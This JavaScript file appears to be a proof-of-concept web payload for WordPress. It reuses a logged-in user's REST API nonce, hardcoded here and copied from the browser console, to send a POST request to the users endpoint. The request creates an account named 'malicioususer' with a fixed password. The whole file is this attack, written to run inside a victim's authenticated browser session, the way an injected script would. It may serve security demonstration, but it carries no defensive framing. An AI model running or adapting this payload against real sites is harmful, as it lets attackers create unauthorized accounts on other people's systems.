/**
 * Get a Promise for the current nonce for authentication.
 *
 * @return Promise A promise for the current WordPress nonce.
 */
function getNoncePromise() {
  // This will ONLY work on my machine.
  // During development we are returning a hardcoded nonce.
  // I got this value by running 'wpApiSettings.nonce' in the browser console
  // while on a backend editor page.
  return new Promise((resolve, reject) => {
    resolve('b1772887b9');
  });
}

/**
 * Get the password to assign to the new user.
 *
 * @return string The new user password.
 */
function getPassword() {
  return 'iambad';
}

function getFetchOptionsPromise() {
  return new Promise((resolve, reject) => {
    getNoncePromise()
      .then((nonce) => {
        resolve({
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            'X-WP-Nonce': nonce,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            username: 'malicioususer',
            email: 'malicioususer@example.com',
            password: getPassword(),
            roles: 'subscriber',
          })
        })
      })
      .catch((response) => {
        console.error('Failed to get Nonce', {response});
        reject(response);
      });
    });
}

/**
 * Get the WP REST API endpoint for users.
 *
 * @return string WP REST API endpoint for users.
 */
function getUsersEndpoint() {
  return '/wp-json/wp/v2/users';
}

function getRequestPromise() {
  return new Promise((resolve, reject) => {
    getFetchOptionsPromise()
      .then((fetchOptions) => {
        resolve(new Request(getUsersEndpoint(), fetchOptions));
      })
      .catch((response) => {
        console.error('Failed to get request', {response});
        reject(response);
      });
    });
}

getRequestPromise()
  .then((request) => {
    fetch(request)
      .then((response) => {
        console.log({response});
        return response.json();
      })
      .then((data) => {
        console.log({data});
      });
  })
  .catch((response) => {
    console.error('Failed to get Nonce', {response});
  })
